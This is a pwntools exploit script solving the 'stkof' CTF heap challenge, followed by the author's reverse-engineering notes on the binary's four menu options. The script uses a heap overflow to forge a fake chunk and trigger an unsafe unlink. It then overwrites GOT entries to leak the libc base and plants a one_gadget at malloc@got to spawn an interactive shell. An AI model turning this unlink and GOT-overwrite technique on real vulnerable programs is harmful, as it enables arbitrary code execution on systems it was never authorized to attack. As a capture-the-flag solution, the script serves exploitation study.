#!/usr/bin/env python3

from pwn import *

exe = ELF("./stkof")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    heap_storage = 0x00602140

    def alloc(size):
    	r.sendline("1")
    	r.sendline(str(size))

    def write(idx, size, data):
    	r.sendline("2")
    	r.sendline(str(idx))
    	r.sendline(str(size))
    	r.send(data)

    def free(idx):
    	r.sendline("3")
    	r.sendline(str(idx))

    def show(idx):
    	r.sendline("4")
    	r.sendline(str(idx))

    alloc(0x10) # 1 so that #2 and #3 are next to each other
    alloc(0x80) # 2
    alloc(0x80) # 3
    alloc(0x10) # 4 avoid heap wilderness

    # set up fake chunk and corrupt chunk #3
    write(2, 0xa8, p64(0) + p64(0x80) + p64(heap_storage + 8*2 - 0x18) + p64(heap_storage + 8*2 - 0x10) + "\x00" * 96 + p64(0x80) + p64(0x90) + p64(0) + p64(0) + p64(0))
    
    free(3) # trigger unlink

    # libc leak
    write(2, 0x18, "\x00" * 0x10 + p64(exe.got['strlen']))
    write(1, 0x8, p64(exe.symbols['puts']))
    write(2, 0x18, "\x00" * 0x10 + p64(exe.got['malloc']))
    show(1)
    libc.address = u64(r.recvuntil("...")[-10:-4] + "\x00\x00") - 0x84130
    log.info("libc base address: {}".format(hex(libc.address)))

    # place one_gadget at malloc@got

    one_gadget = libc.address + 0xf02a4
    write(2, 0x18, "\x00" * 0x10 + p64(exe.got['malloc']))
    write(1, 0x8, p64(one_gadget))

    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
4 options
starts with index 1
no pie, partial relro
we can't leak anything since there is no useful print function at play -> stuck with ELF


option1
	- we can input a size (long long) and it will malloc it for us
	- increment counter
	- save heap pointer based on counter
	- no inuse check?

option2
	- we can give index < 0x100001
	- checks if there is pointer stored there
	- asks us for long long size
	- overflow

option3
	- we can give index < 0x100001
	- checks if there is pointer stored there
	- frees and clears the pointer

option4
	- we can give index < 0x100001
	- checks if there is pointer stored there
	- strlens and gives "//TODO" or "..." ????
	- maybe overwrite got of strlen?

'''